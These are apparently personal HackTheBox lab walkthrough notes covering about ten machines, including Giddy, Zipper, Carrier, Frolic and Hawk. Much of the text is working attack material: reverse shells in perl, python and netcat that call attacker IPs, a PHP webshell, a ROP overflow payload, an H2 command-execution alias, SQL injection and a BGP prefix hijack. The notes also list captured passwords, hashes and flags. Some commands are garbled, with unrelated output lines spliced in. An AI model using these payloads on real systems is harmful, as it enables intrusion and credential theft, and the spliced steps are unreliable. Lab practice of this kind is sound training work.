HTB GIDDY
1)Enumeration with zenmap show open ports 80,443,3389
2)Going with browser to the machine ip shows us its a IIS server.
3)Running dirbuster we found 2 interesting dirs
/remote for powershell
/cvm
4)Running owasp-zap i managed to found to sqli injectable points the most important being http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1
5)I try to inject but not response just errors
6)Running sqlmap shows us its a mssql database
7)So i can try to get a sql-shell with this command
 
sqlmap -u 'http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1*" -â”‚[SMBv2] NTLMv2-SSP Username : GIDDY\Stacy                                    
-dbms=mssql' --sql-shell
 
Annnd we got a shell.
7)doing some research we found this command
EXEC master..xp_dirtree '\\10.10.15.43\dumbythegrey'
to show us all the dirs and files from a remote machine, but we must find a way to intercept this data so we use Responder
8)setting up responder with $responder -I tun0 -wrf and launching the above command we manage to intercept some critical info:****************************************
[SMBv2] NTLMv2-SSP Client   : 10.10.10.104
[SMBv2] NTLMv2-SSP Username : GIDDY\Stacy
[SMBv2] NTLMv2-SSP Hash     : Stacy::GIDDY:b1878626a82d72fa
[*] Skipping previously captured hash for GIDDY\Stacy
[*] Skipping previously captured hash for GIDDY\Stacy
[*] Skipping previously captured hash for GIDDY\Stacy
**************************************************
9) now lets crack that hash
 
cmd.exe /c 'C:\Users\Stacy\launcher.bat'
 
using hashcat -m 54000 file.hash rockyou.txt we found the password is:
 
xNnWo6272k7x
 
10)So with this credentials we can go to /remote and try it
on first attemp with creds its shows us some shells running but instantly logged out
11)trying again seems to got an error
12)After so much strugging i found to login with a the creds into a powershell we must provide the full path user
 
MACHINE\User   so its GIDDY\Stacy
13)And we managed to login and grab the user flag
14)now into priv scalation
15)Running basic enumeration for win machines was able to found not so much
16)Then in stacy Documents Folder we found an app called Unify-video
17)we search online and found a vulnerability priv esc for this specific app
the vulnerability https://www.exploit-db.com/exploits/43390/
*****The ProgramData folder its a dir located in C:\ but its hidden*****
18)So we create a bat file with our payload:
echo @off
C:\Users\Stacy\Documents\nc -e cmd 10.10.15.43 4949
19)Now we have to convert this bat to an exe file so i found a site online that does that and download the exe file
20)upload netcat and taskkill.exe with wget or iwr command like this:
wget http://10.10.12.197:80/nc.exe -UseBasicParsing -OutFile nc.exe
wget http://10.10.12.197:80/taskkill.exe -UseBasicParsing -OutFile taskkill.exe
21)now move your taskkill.exe file to the app data folder located in C:\ProgramData\unifi-video
22)start your nc listener locally
23)go to that dir and start and stop the unifi-video service like this:
start-service "Ubiquiti UniFi Video"
stop-service "Ubiquiti UniFi Video"; ps;   ## notice we append the ps command for a powershell process
24)And we got a reverse nc shell with authority-system privileges
25)Grab your root flag  : >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> CF559C6C121F683BF3E56891E80641B1
 

HTB ZIPPER
1)Nmap shows open port 80 and 22
2)navigating to 80 show default apache server
3)Running dirb with a custom wordlist for webapps we found /zabbix login page
4)we login as guest and try to find something,
we found zabbix was changed to zapper so we can try as login and bingo!!
5)user its unable to login dashboard so we must find another way.
6)Doing so much thing i managed to get the api json zabbix its using /jsrpc.php
7)So i create a script with python to manage to connect to api and make requests
8)I make a request to create a new user with super admin privileges and we login to the dashboard
create a script for zabbix administrator a reverse shell with perl:
perl -e 'use Socket;$i="10.10.15.166";$p=444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
9)The execute script must execute on zabbix agent not on server cuz server its a docker container(rabbit hole)
10)server id to execute script its 10106
11)we managed to get a reverse shell but cant read files.
found a passwd ZippityDoDah
12)now get a reverse shell for zabbix agent and once login spawn a tty shell with
python3 -c 'import pty; pty.spawn("/bin/sh")''
13)grab the user flag
14)copy the ssh key for a stable shell
15)looking for basic privilege scalation an enumeration.
we see theres a binary with root privileges that SUID enabled
running strings zabbix-service
we see its running systemctl as root so we can do that
to removed unwanted symbolic links in dir : find -name l -delete
so first:
1) exporth PATH=.
2) /bin/echo '/bin/sh -i' >> systemctl
3) /bin/chmod +x systemctl
4) ./zabbix-service ... start
5) read the root flag  >>>>>>>>>>>>>>>>>>>>>  a7c743d35b8efbedfd9336492a8eab6e
 
 
HTB MISCHIEF
1)Enumeration shows open port 22, 3366 and upd 161 running snmp
2)So we do snmpwalk -v 1 -c 10.10.10.92 and throws a bunch of info
3)searching for good info i found on snmp log a user and a password:   loki:godofmischiefisloki running on a SimpleHTTPAuthServer.
4)then going to 10.10.10.92:3366 ask for user and password so we provide the credentials we found and login
5)There some new credentials in here loki:trickeryanddeceit
6)we found an image
7)image its rabitt hole
8)from nmap full scan we notice some more ports and from snmpwalk we notice apache and mysql its running but not showing up so it mus be ipv6.
9)so we download an ipv6 ennumeration tool like enyx for snmp run it and shows ipv6 address: [dead:beef::250:56ff:feb9:a728]
10)remember ipv6 adress changes every reboot
11) now we use it in browser and another login page tried all creds with user we got so far but theyre not working.
12) keep enummerating
13)tried all basic users standar users, none seems to work after i remember another standard user administrator -.- that worked with second password.
14)we managed to login to the Command Execution Panel and try a few commands and looks that theyre not working.
15)In fact they work but as we see in snmpwalk enumeration all the output its being send to /dev/null so we must find a way to redirect it to us.
16)So we must run our command like this: cat /home/loki/* &> STDOUT  ||->>>>>>>>>
       so in shorter explaination we redirect the output to the standard or STDOUT and we cat /home/loki/*  (all) because
       while i was trying to read the contents it doesnt work if i just typed /home/loki/credentials so we cat all and
       redirect it to stdout!
and got ssh passwd   lokiisthebestnorsegod
17)Privilege Scalation
18)Searching in lokis home im not being able to find anything also loki's user cannot run sudo or su so we must find a way to get to another user.
 
The user we use to get the loki's password it was www-data user so we execute a reverse ipv6 shell from command console on ipv6 browser with:
 
notice we have to use our ipv6 local address
 
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::1384",4444,0,3));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
 
Alternatively we can run the same python reverse shell with loki user
but before the command we must append
$ systemd-run (python command) **but without the scope value "0,3"**
 
with the loki shell we can place the same python script in a /tmp/ fle and then
make a crontab into the RCE form to execute it as www-data
loki@Mischief:~$ cat /tmp/shell.sh
#!/bin/bash
python -c 'import
socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::1068",2222));os.dup2(s.fleno(),0);
os.dup2(s.fleno(),1); os.dup2(s.fleno(),2);p=pty.spawn("/bin/sh");'
ping -c 2 127.0.0.1&&(crontab -l 2>/dev/null; echo "*/1 * * * *
/tmp/shell") | crontab - ;
wait a minute and usllget the reverse shell
 
and got ourselves a shell for www-data and it can execute sudo or su.
19)we must find www-data su password and we found in loki's .bash_history in the python part:  
 
lokipasswordmischieftrickery
 
we gain root access but the flag isnt located here, get a shell it says.
 
20)But we are in a root shell we dont need anything more so we search for another root.txt file with command
 
find -name root.*
 
and the flag its stored in usr/lib/gcc/x86_64-linux-gnu/7/root.txt
 
so we navigate to that dir and cat root.txt with its content:
 
ae155fad479c56f912c65d7be4487807
 
HTB FROLIC
 
1) As always enum
2) visit 2 sites and dirbuster in diferent ports 9999 and 1880 open 22 open 139 and 445
3) found 2 sites on 9999 site : /backup and /admin login to admin are in source code and js script
4) admin login shows a weird code
5) backup page show user and pass txt admin:imnothuman
6)the weird code its formated in Ook go to decode.fr and decode it
7)the decoded Ook strings points to a dir /asdiSIAJJ0QWE9JAS/
8)dir contains encoded zip to decode and download go to freeformater
9)crack zip file with fcrackzip -v -u -D -p /usr/share/dic/words
10) password
11)found index.php with another coded
12) decoded first hex to ascii to base64 to brainfuck and get the password "idkwhatispass"
13)found dir with gobuster and medium dic for playsms
14)get a meterpreter session with
exploit/multi/http/playsms_uploadcsv_exec user and pass you got
15)get the user flag
16)ldd rop to know the lib adrres its using
17)export PATH=/usr/lib/gcc/i686-linux-gnu/5:/sbin:/bin:/usr/sbin:/usr/bin
18)start searching for system, execve, exit and /bin/sh adresss
19)upload the script libc-search.c
20)compile it like this gcc libc-search.c -o libc-search -lc -ldl and run
21)search -s system then -s exit then -s execve
22)search -p /bin/sh -b "libcstring"  --------> 0xb7e190003
23)begin to make our exploit with python
The exit address is: 0xb7e479d0
The system address is: 0xb7e53da0
The execve address is: 0xb7ec97e0
The /bin/sh address is: 0xb7f74a0b
cat /proc/$$/maps | grep stack bffdf000-c0000000 rw-p 00000000 00:00 0 [stack]
 
## stack address begins wiht \x00 so we changed to \xe0
 
exit() -> "\xd0\x79\xe4\xb7"; system() -> "\xa0\x3d\xe5\xb7"; execve() -> "\xe0\x97\xec\xb7"
stack is \xe0\xf0\xfd\xbf
so buffer at 48, dummy at 4, execve pointer, exit pointer, /bin/sh pointer, and stack pointer which acts as system
 
so exploit its
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>    
python -c 'print "A"*48+"B"*4+"\xe0\x97\xec\xb7"+"\xc8\x97\xec\xb7"+"\x0b\x4a\xf7\xb7"+"\xe0\xf0\xfd\xbf"+"\xe0\xf0\xfd\xbf"'
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
24)run ./rop $(exploit)
25)cat root flag   85d3fdf03f969892538ba9a731826222
 
HTB CARRIER
1)Do a full port scan TCP and UDP
2)Found login page whic contains some codes about errors saying password its the chassis number
3)got port 161 running snmp
4)use snmpwalk -v 1 -c public 10.10.10.105
5) got the number SN#NET_45JDX23
6)Login with user admin and the pass
Notice the tickets area with useful info normally unresolved issues are vulns.
7)Notice the diagnostics verify status
8)capture the request with burp and notice check= parameter it ask for ps aux | grep quagga
9)the commands must be encoded in base 64 to work
9)so we can chain another command to it like nc but /bin/sh its giving us problems so we specify /bin/bash
quagga; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.x.x 4444 >/tmp/f
in base64 encoded:
cXVhZ2dhOyBybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vYmFzaCAtaSAyPiYxfG5jIDEwLjEwLjE1LjEzNCA0NDQ0ID4vdG1wL2Y=0)
10)get user flag
Previusly with gobuster we manage to find a diagram with the servers that linked with quagga.
11) find the routes and from hint in login pages tickets we get:
"one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network", and after flushing the iptables rules and just doing a ping sweep I found 10.120.15.1 and 10.120.15.10.encoded in base 64:
 
12)10.120.15.10 has an FTP server, .1 does not. So I'm pretty sure 10.120.15.10 is the FTP server.
 
I also tried injecting a network in bgpd.conf, namely:
 
"network 10.120.15.0/21"
 
Then systemctrl restart quagga.
 
I then tried to sniff with tcpdump on eth1.
 
Why eth1? Because from the diagram (diagram_for_tac.png) and a lot of network enumeration it seems:
We cab upload a nmap binary to scan for network in local.
The box you get a shell on is AS100.
The "important FTP server" is connected to AS300.
AS100 is connected to both AS200 and AS300.
Connections to the FTP server are probably originating from AS200. To reach 10.120.15.10 it need to go through AS300, we want it to go through us instead by claiming we have this prefix connected to us even when we don't.
 
We receive traffic from AS200 on eth1, so eth1 it is.
 
I didn't get anything though.
 
But this would be just a prefix hijack, the ASPATH is just as long both going through us (AS100) as through AS300. Hence a subprefix hijack attack is needed, I think?
 
In a subprefix hijack we need to announce a new prefix, i.e. a longer prefix, from what I understand from doing some reading. That means ... a more specific subnet?
 
the FTP server is at 10.120.15.10, you need to configure eth2 up as that IP, and you need to inject a network with a long prefix, such as 10.120.15.8/29 into the bgpd.conf, .8 because the subnetmask only allows for a few hosts, and we want it to overlap with .10.
 
Try that, and be aware of that pesky script under /opt which resets the whole thing, I just gave it a .bak extension to prevent the thing from running.
 
Then you should start getting FTP traffic.
 
so I set the eth2 adapter to 10.120.15.10 netmask 255.255.255.0 and added network 10.120.15.8/29 to the bgpd.conf file and changed the restore.sh to restore.sh.bak
restart the quagga service
Then start up nc and bind it to that IP and listen for incoming FTP:
Alternate we can use ftpd.py and upload to the machine.
when it connects throw a 220 FTP response and then a 331 FTP response and it will get you the root credentials for you to ssh.
13)credentials are:
                        root:BGPtelc0rout1ng
 
14)now login through ssh with new credentials ----->>> ssh root@10.10.10.105
15)get root flag and secret
Root flag: 2832e552061532250ac2a21478fd4866
 
 
HTB SECNOTES
1)Enumeration with nmap discovering open ports full tcp scan all ports
2)enter web page and create a user with a sqli query ' OR '1'='1
3)search in the notes for user and pass  :  92g!mA8BGjOirkL%OG*&
4)login with smbclient and upload a shell like this:
       
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
 
5)Using nc.exe establish a reverse connection to attacker machine wiht nc -nv 10.10.xx.xx 4444 -e cmd.exe
6)notice the weird distro folder containig ubuntu so we must find bash.exe running dir bash.exe /s /p
7)run bash.exe and search for the past and login with smbclient with credentials:
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\127.0.0.1\c$
8)GET the root.txt flag
 
HTB YPUFFY
1) Enum ldap and find the hashes for alice user
2) use the hashes with smb login
3) get the ssh key and login trough ssh
4) read the doas.conf httpd.conf and sshd_config
5) try to enumerate users and principals with curl with command /usr/local/bin/curl -i 'http://127.0.0.1/sshauth?type=principals&username=root'
6)go to /tmp and generate a ssh id_rsa key for alice
7)generate certificate for principal with id_rsa private key generated with command
doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I alice1978 -n 3m3rgencyB4ckd00r id_rsa
8)login with ssh to root@localhost with private key
9)flag
 
HTB Bounty
1)Enumerate and find .aspx files
2)find upload webapp and use format web.config with correct payload
3)upload payload and use your RCE
4)powershell download files thorugh webshell
 - powershell $WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile('http://10.10.15.x/payload.exe','C:\netpub\wwwroot\UploadedFiles\payload.exe')
 - powershell \path\to\payload
5)run payload with powershell
6)multi handler meterpreter
7)migrate to x64 shell
You can do this by running the following commands after you already have a 32 bit Meterpreter shell: use windows/local/payload_inject 
set payload windows/x64/meterpreter/reverse_tcp
or looking for proccess that are already running x64 and migrate to it
8)run post explotation module and exploit(root)
 
 
HTB WALDO
 
1) Usando burp suite se encuentra la ruta en la cual se puede hacer el directory transversal desde este se encuentra la vulnerabilidad y notamos que existe un filtro el cual se puede evadir usando ./ para ir al primer directorio y luego ....//(para saltar el filtro).
2) Al encontrar la llave ssh del usuario nobody esta se debe formatear y se deben borrar todos los caracteres "\n"asi como "\"y se formatea en https://www.samltool.com/format_privatekey.php.
 
3) logearse por ssh con el usuario nobody
 
4)login again with the same ssh key from remote machine as monitor to localhost with args -t bash -norc" without quotes to break the default bash login
 
5)run "/usr/bin/tac /root/root.txt
 
HTB HAWK
 
1)As usual enum nmap shows port 80, 21 , 22, 8082 ---> runing H2 DATABASE
2)web page show login, register and few rabbit holes
3)dirb shows a bunch of dirs and files none of those seems to help
4)login through ftp on port 21 with user anonymous found a dir with a encrypted file on it
5)using file + name of the encrypt file shows "openssl enc'd data with salted password, base64 encoded"
6)research for a tool to do de decrypt procces and found https://github.com/deltaclock/go-openssl-bruteforce
7)Download and bruteforce with ./openssl-brute -file /path
8)decrypted file shows:
Daniel,
 
Following the password for the portal:
 
PencilKeyboardScanner123
 
Please let us know when the portal is ready.
 
Kind Regards,
 
IT department
 
9)The credentials they sad are mean user daniel but for work in portal he needs to be admin so the user admin and password in the mail.
10)login and search for modules and enable php filter save config and go to content>> article >> new article
11) in name any name in content of the article paste your shell ill use p0wny shell.
12)grab user flag
13)enumerating for config files i was able to locate /var/www/html/sites/default/settings.php where it its stored the user and password for database which is drupal:drupal4hawk and trying it with daniel i managed to login through ssh.
14)enumeration with enum4lin i was able to realize the service for h2 console when we acces through browser its says it only allows local connections to the service so we have to create a ssh tunnel to it:
 
â””â”€â”€â•¼ #ssh -D 1080 -L6801:127.0.0.1:7082 -L6802:127.0.0.1:8082 daniel@10.10.10.102
another way of ssh tunneling is:
daniel@hawk:~$
daniel@hawk:~$ <---here i type ~C ssh> -D 8082
Forwarding port.
 
then we can verify im listenning on this port on local machine:
 
netstat -anlp | grep 8082
tcp 0 0 127.0.0.1:8082 0.0.0.0:* LISTEN 3445/ssh
tcp6 0 0 ::1:8082 :::* LISTEN 3445/ssh
 
once we create the tunnel just access with 127.0.0.1:6802 for tunneling method 1 or 127.0.0.1:8082 for method 2 through browser .
 
15)once we access we found by trial and error that database its test no Ëœtest and user was "sa" and password was the same "sa" so i login in and voila!
 
16) once we got the H2 console so we can execute java code for creating an ALIAS and run
 
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\A"); return s.hasNext() ? s.next() : ""; }$$;
 
then just CALL SHELLEXEC('cat root.txt')
 
Another viable way its using 44422.py exploit from exploit.db with python3, python2 cause problems.
 
with this command
â””â”€â”€â•¼ #python3 44422.py -H 127.0.0.1:6802 -d jdbc:h2:tcp://10.10.10.102/~/drupal
 
where the -d argument its the host where the database its allocated look we dont need any user and password just the exploit as it its with the correct database path -d jdbc:h2:tcp://10.10.10.102/~/drupal.
54f3e840fe5564b42a8320fd2b608ba0
DONE!!
